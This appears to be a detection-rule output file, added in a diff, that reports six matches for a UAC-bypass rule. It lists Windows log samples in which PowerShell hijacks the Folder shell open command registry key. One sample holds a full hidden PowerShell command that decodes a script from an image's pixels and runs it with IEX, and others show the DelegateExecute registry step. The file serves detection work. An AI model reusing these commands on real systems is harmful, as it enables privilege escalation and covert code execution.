@@ -1,0 +1,46 @@
+{
+  "rule_id": "7cb39dc7-ae81-47a1-b36c-2581534b9a17",
+  "title": "UAC Bypass Registry Hijack in Folder Shell Open Command",
+  "severity": "high",
+  "tags": [
+    "attack.privilege_escalation",
+    "attack.defense_evasion",
+    "attack.t1548.002"
+  ],
+  "total_matches_recorded": 6,
+  "sample_evidence": [
+    {
+      "line": 4718,
+      "timestamp": "2020-05-02 02:57:18.306",
+      "TargetObject": "HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Folder\\shell\\open\\command",
+      "Details": "",
+      "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+    {
+      "line": 5518,
+      "timestamp": "",
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "ScriptBlock": "Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"(Default)\""
+    },
+    {
+      "line": 5628,
+      "timestamp": "2020-05-02 02:58:18.576",
+      "TargetObject": "HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Folder\\shell\\open\\command\\(Default)",
+      "Details": "powershell.exe -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"",
+      "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    },
+    {
+      "line": 5712,
+      "timestamp": "",
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "ScriptBlock": "Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\" -Force"
+    },
+    {
+      "line": 5744,
+      "timestamp": "2020-05-02 02:58:30.649",
+      "TargetObject": "HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Folder\\shell\\open\\command\\DelegateExecute",
+      "Details": "(Empty)",
+      "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    }
+  ]
+}
